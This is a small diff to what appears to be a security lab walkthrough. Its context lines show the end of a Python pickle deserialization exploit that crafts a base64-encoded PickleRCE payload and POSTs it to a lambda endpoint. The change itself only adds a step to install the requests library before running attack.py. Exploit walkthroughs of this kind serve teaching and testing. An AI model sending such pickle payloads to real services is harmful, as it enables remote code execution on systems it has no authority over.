@@ -280,7 +280,10 @@ payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
 requests.post(url, data={pickled: payload})  # Sending POST request
 EOF	
 ```
-	
+
+Install requests dependency:
+` python3 -m pip install requests`
+
 Then run attack.py to exploit, make sure to edit the lambda endpoint in attack.py script:
 	`python3 attack.py`
 
